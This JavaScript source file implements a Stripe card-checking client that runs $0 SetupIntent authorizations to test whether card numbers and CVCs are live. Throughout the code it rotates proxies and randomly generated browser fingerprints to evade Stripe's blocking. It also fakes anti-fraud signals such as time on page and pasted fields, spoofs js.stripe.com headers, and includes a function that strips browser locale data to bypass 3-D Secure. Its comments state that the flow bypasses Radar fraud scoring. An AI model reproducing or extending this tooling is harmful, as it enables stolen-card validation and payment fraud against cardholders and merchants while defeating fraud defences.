/**
 * StripeSetupIntentClient - SetupIntent-based $0 authorization client
 * 
 * Implements the optimal card authorization check flow:
 * 1. Create PaymentMethod using PK key (with checkout.stripe.com origin)
 * 2. Create SetupIntent with confirm=true using SK key
 * 3. SetupIntent runs $0 auth and returns CVC check result
 * 
 * Key benefits:
 * - SetupIntent bypasses Radar (no risk_level, no risk_score)
 * - $0 authorization goes directly to bank
 * - Returns real bank response (not Radar block)
 * 
 * Based on API Tokenization Research (December 2024)
 */

import axios from 'axios';
import crypto from 'crypto';
import { HttpsProxyAgent } from 'https-proxy-agent';
import { SocksProxyAgent } from 'socks-proxy-agent';

// Retryable proxy/network/timeout error patterns
const RETRYABLE_ERRORS = [
    'proxy connection ended before receiving connect response',
    'client network socket disconnected before secure tls connection was established',
    'socket hang up',
    'unknown error',
    'econnreset',
    'etimedout',
    'econnrefused',
    'stream has been aborted',
    'timeout',
    '30000ms exceeded',
    'exceeded',
    'enotfound',
    'network error',
    'request aborted',
    'aborted'
];

export class StripeSetupIntentClient {
    constructor(options = {}) {
        this.baseUrl = 'https://api.stripe.com/v1';
        this.timeout = options.timeout || 30000;
        this.debug = options.debug !== false;
        this.maxRetries = options.maxRetries || 3;
        this.retryDelay = options.retryDelay || 3000;
        this.proxyManager = options.proxyManager || null;
    }

    /**
     * Get a fresh proxy from proxyManager
     * @private
     */
    async _getProxyFromManager() {
        if (this.proxyManager && this.proxyManager.isEnabled()) {
            return await this.proxyManager.getNextProxy();
        }
        return null;
    }

    /**
     * Log debug messages
     * @private
     */
    _log(message, data = null) {
        if (!this.debug) return;
        const prefix = '[StripeSetupIntentClient]';
        if (data) {
        } else {
        }
    }

    /**
     * Check if an error is retryable (proxy/network error)
     * @private
     */
    _isRetryableError(error) {
        const message = (error.message || '').toLowerCase();
        const causeMessage = (error.cause?.message || '').toLowerCase();
        const code = (error.code || '').toLowerCase();

        return RETRYABLE_ERRORS.some(pattern =>
            message.includes(pattern) ||
            causeMessage.includes(pattern) ||
            code.includes(pattern)
        );
    }

    /**
     * Sleep for a given duration
     * @private
     */
    _sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    /**
     * Generate browser fingerprints (required for API calls)
     */
    generateFingerprints() {
        const hex = (len) => crypto.randomBytes(len).toString('hex');
        return {
            guid: `${hex(8)}-${hex(4)}-${hex(4)}-${hex(4)}-${hex(12)}${hex(3)}`,
            muid: `${hex(8)}-${hex(4)}-${hex(4)}-${hex(4)}-${hex(12)}${hex(3)}`,
            sid: `${hex(8)}-${hex(4)}-${hex(4)}-${hex(4)}-${hex(12)}${hex(3)}`
        };
    }

    /**
     * Create proxy agent from config
     * @private
     */
    _createProxyAgent(proxyConfig) {
        if (!proxyConfig) return null;

        const { type, host, port, username, password } = proxyConfig;

        let proxyUrl;
        if (username && password) {
            proxyUrl = `${type}://${username}:${password}@${host}:${port}`;
        } else {
            proxyUrl = `${type}://${host}:${port}`;
        }

        if (type === 'socks4' || type === 'socks5') {
            return new SocksProxyAgent(proxyUrl);
        }
        return new HttpsProxyAgent(proxyUrl);
    }

    /**
     * Create PaymentMethod using PK key
     * Uses checkout.stripe.com origin for optimal compatibility
     * Generates FRESH fingerprints AND proxy on each retry attempt
     * 
     * @param {Object} card - Card details { number, expMonth, expYear, cvc }
     * @param {string} pkKey - Stripe publishable key
     * @param {Object} options - Options { proxy, billing }
     * @returns {Promise<Object>} PaymentMethod result
     */
    async createPaymentMethod(card, pkKey, options = {}) {
        const billing = options.billing || {};
        let lastError = null;

        // Retry loop - generate FRESH fingerprints AND proxy on each attempt
        for (let attempt = 1; attempt <= this.maxRetries; attempt++) {
            try {
                // Get FRESH proxy for each attempt (from options or proxyManager)
                const proxy = options.proxy || await this._getProxyFromManager();

                // Generate FRESH fingerprint for each attempt (critical for 492 bypass)
                const fp = this.generateFingerprints();

                const params = new URLSearchParams();
                params.append('type', 'card');
                params.append('card[number]', card.number);
                params.append('card[cvc]', card.cvc || card.cvv);
                params.append('card[exp_month]', card.expMonth);
                params.append('card[exp_year]', card.expYear);

                // Billing details
                params.append('billing_details[name]', billing.name || 'Card Holder');
                params.append('billing_details[address][country]', billing.country || 'US');
                params.append('billing_details[address][postal_code]', billing.postalCode || '10001');

                // Required fingerprints - FRESH each attempt
                params.append('guid', fp.guid);
                params.append('muid', fp.muid);
                params.append('sid', fp.sid);
                params.append('key', pkKey);
                // UPDATED: Use payment-element user agent (matches success flow)
                params.append('payment_user_agent', 'stripe.js/328730e3ee; stripe-js-v3/328730e3ee; payment-element; deferred-intent; hip');
                // Anti-fraud: simulate manual entry and realistic time
                params.append('time_on_page', String(Math.floor(Math.random() * 50000) + 50000));
                params.append('pasted_fields', 'number');
                // NEW: allow_redisplay for card reuse (matches success flow)
                params.append('allow_redisplay', 'limited');
                // NEW: Client attribution metadata (matches success flow)
                const sessionId = `${fp.guid.slice(0, 8)}-${Date.now().toString(16)}`;
                params.append('client_attribution_metadata[client_session_id]', sessionId);
                params.append('client_attribution_metadata[merchant_integration_source]', 'elements');
                params.append('client_attribution_metadata[merchant_integration_subtype]', 'payment-element');
                params.append('client_attribution_metadata[merchant_integration_version]', '2021');
                params.append('client_attribution_metadata[payment_intent_creation_flow]', 'deferred');
                params.append('client_attribution_metadata[payment_method_selection_flow]', 'merchant_specified');
                // Referrer in body (use js.stripe.com for payment-element)
                params.append('referrer', 'https://js.stripe.com');

                const axiosConfig = {
                    headers: {
                        'Accept': 'application/json',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        // UPDATED: Use js.stripe.com for payment-element flow
                        'Origin': 'https://js.stripe.com',
                        'Referer': 'https://js.stripe.com/',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate, br, zstd',
                        // Sec-Fetch headers for real browser simulation
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-site',
                        'Priority': 'u=4'
                    },
                    timeout: this.timeout,
                    validateStatus: () => true
                };

                // Add FRESH proxy if available (from options or proxyManager)
                if (proxy) {
                    axiosConfig.httpsAgent = this._createProxyAgent(proxy);
                }

                this._log(`Creating PaymentMethod (attempt ${attempt}/${this.maxRetries})`);

                const response = await axios.post(
                    `${this.baseUrl}/payment_methods`,
                    params.toString(),
                    axiosConfig
                );

                // Handle HTTP 492 - Stripe fingerprint blocking - RETRY
                if (response.status === 492) {
                    if (attempt < this.maxRetries) {
                        this._log(`⚠️ HTTP 492 - Retrying with fresh fingerprint in 2s...`);
                        await this._sleep(2000);
                        continue;
                    }
                    return {
                        success: false,
                        error: 'Stripe blocked request - fingerprint issue',
                        code: 'origin_blocked',
                        isBlocked: true,
                        httpStatus: 492
                    };
                }

                // Handle HTTP 429 - Rate Limited - RETRY
                if (response.status === 429) {
                    const retryAfter = parseInt(response.headers['retry-after'] || '5', 10) * 1000;
                    if (attempt < this.maxRetries) {
                        this._log(`⚠️ HTTP 429 Rate Limited - Waiting ${retryAfter}ms...`);
                        await this._sleep(retryAfter);
                        continue;
                    }
                    return {
                        success: false,
                        error: 'Rate limited by Stripe',
                        code: 'rate_limited',
                        isRateLimited: true,
                        httpStatus: 429
                    };
                }

                // Handle Stripe API errors - don't retry
                if (response.data.error) {
                    return {
                        success: false,
                        error: response.data.error.message,
                        code: response.data.error.code,
                        declineCode: response.data.error.decline_code
                    };
                }

                this._log(`✅ PaymentMethod created: ${response.data.id}`);
                return {
                    success: true,
                    paymentMethodId: response.data.id,
                    card: {
                        brand: response.data.card?.brand,
                        last4: response.data.card?.last4,
                        country: response.data.card?.country,
                        funding: response.data.card?.funding
                    },
                    attempts: attempt
                };
            } catch (error) {
                lastError = error;

                const isRetryable = this._isRetryableError(error);
                this._log(`Error: ${error.message}, retryable=${isRetryable}`);

                if (isRetryable && attempt < this.maxRetries) {
                    // Return immediately with needsRetry flag - don't block the worker
                    this._log(`⚠️ Returning for requeue (attempt ${attempt}/${this.maxRetries})...`);
                    return {
                        success: false,
                        error: error.message,
                        isNetworkError: true,
                        needsRetry: true,
                        attemptNumber: attempt,
                        maxRetries: this.maxRetries
                    };
                }
            }
        }

        // All retries exhausted
        this._log(`❌ All ${this.maxRetries} attempts failed`);
        return {
            success: false,
            error: lastError?.message || 'Network error after retries',
            isNetworkError: true,
            retriesExhausted: true
        };
    }

    /**
     * Create and confirm SetupIntent for $0 authorization
     * 
     * @param {string} paymentMethodId - PaymentMethod ID from createPaymentMethod
     * @param {string} skKey - Stripe secret key
     * @param {Object} options - Options { proxy }
     * @returns {Promise<Object>} SetupIntent result
     */
    async createSetupIntent(paymentMethodId, skKey, options = {}) {
        const params = new URLSearchParams();
        params.append('payment_method', paymentMethodId);
        params.append('confirm', 'true');
        params.append('usage', 'off_session');

        const axiosConfig = {
            auth: { username: skKey, password: '' },
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            timeout: this.timeout,
            validateStatus: () => true
        };

        // Add proxy if configured
        if (options.proxy) {
            axiosConfig.httpsAgent = this._createProxyAgent(options.proxy);
        }

        try {
            const response = await axios.post(
                `${this.baseUrl}/setup_intents`,
                params.toString(),
                axiosConfig
            );

            const si = response.data;

            if (si.error) {
                return {
                    success: false,
                    error: si.error.message,
                    code: si.error.code,
                    declineCode: si.error.decline_code,
                    errorType: si.error.type
                };
            }

            // Extract details from setup intent
            const latestAttempt = si.latest_attempt;
            const pmDetails = latestAttempt?.payment_method_details?.card;

            return {
                success: true,
                setupIntentId: si.id,
                status: si.status,
                cvcCheck: pmDetails?.checks?.cvc_check,
                avsLine1Check: pmDetails?.checks?.address_line1_check,
                avsPostalCheck: pmDetails?.checks?.address_postal_code_check,
                threeDSecure: pmDetails?.three_d_secure,
                nextAction: si.next_action,
                lastError: si.last_setup_error
            };
        } catch (error) {
            this._log(`createSetupIntent error: ${error.message}`);
            return {
                success: false,
                error: error.message
            };
        }
    }

    /**
     * Attempt 3DS frictionless bypass
     * Uses stripped browser data (empty browserLanguage and browserTZ)
     * 
     * @param {Object} nextAction - next_action from SetupIntent
     * @param {string} pkKey - Stripe publishable key
     * @param {Object} options - Options { proxy }
     * @returns {Promise<Object>} Bypass result
     */
    async attempt3DSBypass(nextAction, pkKey, options = {}) {
        if (!nextAction || nextAction.type !== 'use_stripe_sdk') {
            return { success: false, reason: 'Not a 3DS2 flow' };
        }

        const source = nextAction.use_stripe_sdk?.source ||
            nextAction.use_stripe_sdk?.three_d_secure_2_source;

        if (!source) {
            return { success: false, reason: 'No 3DS source found' };
        }

        // Build browser data with STRIPPED locale (key bypass technique)
        const browserData = {
            browserJavaEnabled: false,
            browserJavascriptEnabled: true,
            browserLanguage: '',        // STRIPPED for bypass
            browserColorDepth: '24',
            browserScreenHeight: '1080',
            browserScreenWidth: '1920',
            browserTZ: '0',             // STRIPPED for bypass
            browserUserAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
        };

        const params = new URLSearchParams();
        params.append('source', source);
        params.append('browser', JSON.stringify(browserData));
        params.append('one_click_authn_device_support[hosted]', 'false');
        params.append('one_click_authn_device_support[same_origin_frame]', 'false');
        params.append('one_click_authn_device_support[spc_eligible]', 'false');
        params.append('one_click_authn_device_support[webauthn_eligible]', 'false');
        params.append('key', pkKey);

        const axiosConfig = {
            headers: {
                'Origin': 'https://js.stripe.com',
                'Referer': 'https://js.stripe.com/',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            timeout: this.timeout,
            validateStatus: () => true
        };

        // Add proxy if configured
        if (options.proxy) {
            axiosConfig.httpsAgent = this._createProxyAgent(options.proxy);
        }

        try {
            const response = await axios.post(
                `${this.baseUrl}/3ds2/authenticate`,
                params.toString(),
                axiosConfig
            );

            if (response.data.id) {
                // 3DS bypassed - frictionless approval
                return {
                    success: true,
                    bypassed: true,
                    authId: response.data.id
                };
            } else if (response.data.ares?.acsURL) {
                // Challenge required - bank requires OTP
                return {
                    success: false,
                    challengeRequired: true,
                    acsUrl: response.data.ares.acsURL
                };
            } else {
                return {
                    success: false,
                    error: response.data.error?.message || 'Unknown 3DS response'
                };
            }
        } catch (error) {
            this._log(`attempt3DSBypass error: ${error.message}`);
            return { success: false, error: error.message };
        }
    }

    /**
     * Get SetupIntent details (for checking final status after 3DS)
     * 
     * @param {string} setupIntentId - SetupIntent ID
     * @param {string} skKey - Stripe secret key
     * @param {Object} options - Options { proxy }
     * @returns {Promise<Object>} SetupIntent details
     */
    async getSetupIntentDetails(setupIntentId, skKey, options = {}) {
        const axiosConfig = {
            auth: { username: skKey, password: '' },
            timeout: this.timeout,
            validateStatus: () => true
        };

        // Add proxy if configured
        if (options.proxy) {
            axiosConfig.httpsAgent = this._createProxyAgent(options.proxy);
        }

        try {
            const response = await axios.get(
                `${this.baseUrl}/setup_intents/${setupIntentId}`,
                axiosConfig
            );

            const si = response.data;
            const pmDetails = si.latest_attempt?.payment_method_details?.card;

            return {
                success: true,
                status: si.status,
                cvcCheck: pmDetails?.checks?.cvc_check,
                declineCode: si.last_setup_error?.decline_code,
                error: si.last_setup_error?.message
            };
        } catch (error) {
            this._log(`getSetupIntentDetails error: ${error.message}`);
            return { success: false, error: error.message };
        }
    }

    /**
     * Cancel a SetupIntent (cleanup after successful auth)
     * 
     * @param {string} setupIntentId - SetupIntent ID
     * @param {string} skKey - Stripe secret key
     * @param {Object} options - Options { proxy }
     * @returns {Promise<Object>} Cancel result
     */
    async cancelSetupIntent(setupIntentId, skKey, options = {}) {
        const axiosConfig = {
            auth: { username: skKey, password: '' },
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            timeout: 10000,
            validateStatus: () => true
        };

        // Add proxy if configured
        if (options.proxy) {
            axiosConfig.httpsAgent = this._createProxyAgent(options.proxy);
        }

        try {
            await axios.post(
                `${this.baseUrl}/setup_intents/${setupIntentId}/cancel`,
                '',
                axiosConfig
            );
            return { success: true };
        } catch (error) {
            // Can't cancel succeeded SetupIntents, that's OK
            return { success: false, error: error.message };
        }
    }
}

export default StripeSetupIntentClient;
